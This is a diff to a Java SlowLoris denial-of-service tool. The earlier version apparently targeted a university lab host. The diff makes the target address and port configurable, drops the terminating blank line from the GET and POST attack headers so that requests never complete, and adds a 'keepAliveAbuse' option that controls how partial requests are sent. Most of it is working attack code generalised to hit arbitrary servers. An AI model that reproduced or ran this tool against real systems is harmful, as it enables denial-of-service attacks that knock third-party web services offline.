@@ -2,6 +2,7 @@ package SlowLoris;
 
 import java.io.*;
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.util.regex.Pattern;
 
@@ -9,6 +10,7 @@ public class SlowLoris {
     private String netAddr;
     private int port;
     private int numConnections;
+    private boolean keepAliveAbuse;
 
     public static final int DEFAULT_CONNECTIONS = 10;
     public static final int MAX_CONNECTIONS = 300;
@@ -65,7 +67,11 @@ public class SlowLoris {
             }
             System.out.println("Successful connection #" + requestCount + "\n");
             try {
-                out.println(generatePostAttackString());
+                if(keepAliveAbuse) {
+                    out.println(generateAttackString());
+                } else {
+                    out.print(generateAttackString());
+                }
                 out.flush();
                 //String response = in.readLine();
                 //responses[i] = response;
@@ -132,7 +138,7 @@ public class SlowLoris {
     private String generateAttackString() {
         String s;
         s = "GET / HTTP/1.1\n";
-        s += "Host: loki.ist.unomaha.edu:11182\n";
+        s += "Host: " + netAddr + ":" + port + "\n";
         s += "Connection: keep-alive\n";
         s += "Pragma: no-cache\n";
         s += "Cache-Control: no-cache\n";
@@ -141,30 +147,37 @@ public class SlowLoris {
         s += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n";
         s += "Accept-Encoding: gzip, deflate, sdch\n";
         s += "Accept-Language: en-US,en;q=0.8\n";
-        s += "\n";
         return s;
     }
 
     private String generatePostAttackString() {
         String s;
-        s = "POST /classes/index.cgi/search HTTP/1.1\n";
-        s += "Host: loki.ist.unomaha.edu:11182\n";
+        s = "POST / HTTP/1.1\n";
+        s += "Host: " + netAddr + ":" + port + "\n";
         s += "Connection: keep-alive\n";
         s += "Content-Length: 21\n";
-        s += "Origin: http://loki.ist.unomaha.edu:11182\n";
+        s += "Origin: " + netAddr + ":" + port + "\n";
         s += "Pragma: no-cache\n";
         s += "Cache-Control: no-cache\n";
         s += "Content-Type: application/x-www-form-urlencoded\n";
-        s += "Referer: http://loki.ist.unomaha.edu:11182/classes/\n";
+        s += "Referer: http://" + netAddr + ":" + port + "/\n";
         s += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n";
         s += "Upgrade-Insecure-Requests: 1\n";
         s += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n";
         s += "Accept-Encoding: gzip, deflate, sdch\n";
         s += "Accept-Language: en-US,en;q=0.8\n";
         s += "Message-Body: dpt=csci&sb=Search%21\n";
-        s += "\n";
         return s;
     }
+
+    public boolean isKeepAliveAbuse() {
+        return keepAliveAbuse;
+    }
+
+    public void setKeepAliveAbuse(boolean keepAliveAbuse) {
+        this.keepAliveAbuse = keepAliveAbuse;
+    }
+
     public boolean setNumConnections(int nc) {
         if(nc > 0) {
             numConnections = nc;
